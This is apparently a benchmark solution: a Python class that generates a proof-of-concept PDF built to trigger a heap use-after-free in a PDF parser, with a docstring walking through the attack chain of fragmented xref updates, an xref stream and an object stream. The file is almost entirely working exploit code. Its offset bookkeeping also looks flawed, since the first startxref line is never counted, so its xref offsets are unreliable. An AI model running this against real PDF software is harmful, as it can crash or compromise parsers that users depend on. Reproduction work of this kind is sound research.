import zlib
from typing import Dict, Tuple

class Solution:
    """
    Generates a Proof-of-Concept PDF that triggers a Heap Use After Free vulnerability.

    The vulnerability is triggered by forcing the PDF parser to solidify a highly
    fragmented cross-reference (xref) table while it is in the middle of resolving
    an object from an object stream. This leads to the parser using a dangling
    pointer to a freed xref entry.

    The PoC is constructed as follows:
    1. A base PDF with a few essential objects (Catalog, Pages, Page). The Page
       object contains a reference to a high-numbered object, which will be the
       trigger.
    2. A large number of incremental updates (~68). Each update adds a single,
       simple 'null' object and its own small xref table and trailer. This creates
       a long chain of xref tables, fragmenting the file's structure.
    3. A final, "payload" update. This update uses a modern cross-reference stream
       (/Type /XRef) instead of a classic table. It defines three key objects:
       a. The trigger object, referenced by the Page object. This object simply
          contains a reference to an object inside an object stream.
       b. An object stream (/Type /ObjStm), which is a compressed container for
          other objects.
       c. The object inside the stream. Its existence is declared within the
          cross-reference stream.
    
    The chain of events during parsing is:
    1. The parser loads the chain of xref tables.
    2. It starts parsing from the document root, eventually reaching the Page object
       and its reference to the trigger object.
    3. To load the trigger object, it must resolve its reference to the in-stream object.
    4. The parser looks up the in-stream object in the xref data, finds it's in an
       object stream, and gets a pointer to its internal xref entry.
    5. It then recursively attempts to load the object stream container itself.
    6. During this recursive load, the parser, having noted the large number of
       fragmented xref tables, decides to "solidify" them by merging them into a
       single, optimized table in new memory. This action frees the old xref tables.
    7. The pointer obtained in step 4 now dangles, as it points to freed memory.
    8. After the object stream is loaded, execution returns to parsing the in-stream
       object, where the dangling pointer is used, causing a Use After Free.
    """

    def _build_trailer(self, size: int, root_obj: int = None, prev: int = None) -> bytes:
        """Builds a classic PDF trailer dictionary."""
        trailer = b'trailer\n<<\n'
        trailer += f'/Size {size}\n'.encode()
        if root_obj is not None:
            trailer += f'/Root {root_obj} 0 R\n'.encode()
        if prev is not None:
            trailer += f'/Prev {prev}\n'.encode()
        trailer += b'>>\n'
        return trailer

    def _build_xref_stream(self, obj_num: int, entries: Dict[int, Tuple[int, int, int]], size: int, prev: int, root_obj: int) -> bytes:
        """Builds a cross-reference stream object."""
        if not entries:
            return b''

        obj_nums = sorted(entries.keys())
        first_obj = obj_nums[0]
        # Assuming contiguity for the objects defined in this stream for simplicity
        count = obj_nums[-1] - first_obj + 1
        
        # Field widths: type(1), field1(offset/obj_num)(5), field2(gen/index)(2)
        w = [1, 5, 2]
        stream_data = b''
        
        for i in range(first_obj, first_obj + count):
            entry_type, f1, f2 = entries[i]
            stream_data += entry_type.to_bytes(w[0], 'big')
            stream_data += f1.to_bytes(w[1], 'big')
            stream_data += f2.to_bytes(w[2], 'big')
            
        stream_dict = (
            f'<</Type/XRef/Size {size}/W [{w[0]} {w[1]} {w[2]}]'
            f'/Index [{first_obj} {count}]/Root {root_obj} 0 R'
            f'/Prev {prev}/Length {len(stream_data)}>>'
        )
        
        obj = f'{obj_num} 0 obj\n'.encode()
        obj += stream_dict.encode()
        obj += b'\nstream\n'
        obj += stream_data
        obj += b'\nendstream\nendobj\n'
        
        return obj

    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        """
        pdf_parts = []
        offsets = {}
        current_offset = 0
        
        # Configuration to tune PoC size close to the ground-truth length
        dummy_obj_count = 68
        base_obj_count = 3
        
        trigger_obj_num = base_obj_count + dummy_obj_count + 1
        objstm_obj_num = trigger_obj_num + 1
        instream_obj_num = trigger_obj_num + 2
        xrefstm_obj_num = trigger_obj_num + 3
        
        max_obj_num = xrefstm_obj_num
        final_size = max_obj_num + 1
        
        # PDF Header
        header = b'%PDF-1.7\n%\xe2\xe3\xcf\xd3\n'
        pdf_parts.append(header)
        current_offset += len(header)

        # Base objects (Catalog, Pages, Page)
        obj1 = b'1 0 obj <</Type/Catalog/Pages 2 0 R>> endobj\n'
        offsets[1] = current_offset
        pdf_parts.append(obj1)
        current_offset += len(obj1)

        obj2 = b'2 0 obj <</Type/Pages/Count 1/Kids[3 0 R]>> endobj\n'
        offsets[2] = current_offset
        pdf_parts.append(obj2)
        current_offset += len(obj2)
        
        obj3 = f'3 0 obj <</Type/Page/Parent 2 0 R/Annots[{trigger_obj_num} 0 R]>> endobj\n'.encode()
        offsets[3] = current_offset
        pdf_parts.append(obj3)
        current_offset += len(obj3)

        # Base cross-reference table
        xref0_offset = current_offset
        xref0_text = (
            b'xref\n0 4\n'
            b'0000000000 65535 f \n'
            f'{offsets[1]:010d} 00000 n \n'.encode() +
            f'{offsets[2]:010d} 00000 n \n'.encode() +
            f'{offsets[3]:010d} 00000 n \n'.encode()
        )
        pdf_parts.append(xref0_text)
        current_offset += len(xref0_text)

        # Base trailer
        trailer0 = self._build_trailer(size=4, root_obj=1)
        pdf_parts.append(trailer0)
        current_offset += len(trailer0)
        
        pdf_parts.append(f'startxref\n{xref0_offset}\n'.encode())
        last_xref_offset = xref0_offset
        
        # Dummy incremental updates to fragment the xref table
        for i in range(dummy_obj_count):
            obj_num = base_obj_count + 1 + i
            
            # Record current offset for startxref
            update_start_offset = current_offset

            obj = f'{obj_num} 0 obj\nnull\nendobj\n'.encode()
            offsets[obj_num] = update_start_offset
            pdf_parts.append(obj)
            
            xref_offset = update_start_offset + len(obj)
            xref = f'xref\n{obj_num} 1\n{offsets[obj_num]:010d} 00000 n \n'.encode()
            pdf_parts.append(xref)
            
            trailer = self._build_trailer(size=obj_num + 1, prev=last_xref_offset)
            pdf_parts.append(trailer)
            
            # each update has its own startxref
            startxref_text = f'startxref\n{xref_offset}\n'.encode()
            pdf_parts.append(startxref_text)
            
            current_offset = xref_offset + len(xref) + len(trailer) + len(startxref_text)
            last_xref_offset = xref_offset

        # Payload update
        # Trigger object that refers to an object inside the object stream
        obj_trigger = f'{trigger_obj_num} 0 obj <</MyRef {instream_obj_num} 0 R>> endobj\n'.encode()
        offsets[trigger_obj_num] = current_offset
        pdf_parts.append(obj_trigger)
        current_offset += len(obj_trigger)

        # The object stream itself
        stream_header = f'{instream_obj_num} 0 '.encode()
        stream_obj_data = b'<</Foo/Bar>>'
        stream_content = stream_header + stream_obj_data
        first_offset = len(stream_header)
        compressed_stream = zlib.compress(stream_content)
        
        obj_objstm_dict = (
            f'<</Type/ObjStm/N 1/First {first_offset}'
            f'/Filter/FlateDecode/Length {len(compressed_stream)}>>'
        )
        obj_objstm = (
            f'{objstm_obj_num} 0 obj {obj_objstm_dict}\n'.encode() +
            b'stream\n' +
            compressed_stream +
            b'\nendstream\nendobj\n'
        )
        offsets[objstm_obj_num] = current_offset
        pdf_parts.append(obj_objstm)
        current_offset += len(obj_objstm)
        
        # The final cross-reference stream
        xref_stream_entries = {
            trigger_obj_num: (1, offsets[trigger_obj_num], 0), # type 1: normal object
            objstm_obj_num: (1, offsets[objstm_obj_num], 0),   # type 1: normal object
            instream_obj_num: (2, objstm_obj_num, 0),         # type 2: object in stream
        }
        
        xref_stream_obj = self._build_xref_stream(
            obj_num=xrefstm_obj_num,
            entries=xref_stream_entries,
            size=final_size,
            prev=last_xref_offset,
            root_obj=1
        )
        
        offsets[xrefstm_obj_num] = current_offset
        pdf_parts.append(xref_stream_obj)
        current_offset += len(xref_stream_obj)

        # Final startxref pointing to the XRef stream
        pdf_parts.append(f'startxref\n{offsets[xrefstm_obj_num]}\n%%EOF'.encode())
        
        return b''.join(pdf_parts)